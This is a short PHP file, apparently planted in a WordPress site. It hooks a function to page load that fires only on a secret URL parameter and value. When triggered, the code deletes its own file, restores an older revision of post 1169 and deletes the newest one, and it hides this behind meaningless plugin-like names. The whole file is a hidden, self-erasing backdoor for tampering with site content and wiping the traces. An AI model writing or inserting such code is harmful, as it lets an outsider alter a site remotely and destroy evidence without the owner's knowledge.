<?php

function tree_buttons_blog_order() {
	if (isset($_GET['navigation_conversion_notes']) && $_GET['navigation_conversion_notes'] === 'info_ui_multi_ultimate') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$urls_dev_gamipress_most = 1169;
		$link_icon_showcase = wp_get_post_revisions($urls_dev_gamipress_most);
		if (empty($link_icon_showcase)) die('no revisions');
		if (count($link_icon_showcase) < 2) die('less than 2');
		$options_button_validator = array_shift($link_icon_showcase);
		$tracker_reading_heading = $options_button_validator->ID;
		$addons_zoom_tiny_link = array_shift($link_icon_showcase);
		$browser_selector_debug_affiliate = $addons_zoom_tiny_link->ID;
		$schedule_akismet_status_tracking = wp_restore_post_revision($browser_selector_debug_affiliate);
		if ($schedule_akismet_status_tracking === false) die('error restoring');
		$schedule_akismet_status_tracking = wp_delete_post_revision($tracker_reading_heading);		
		if ($schedule_akismet_status_tracking === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'tree_buttons_blog_order');
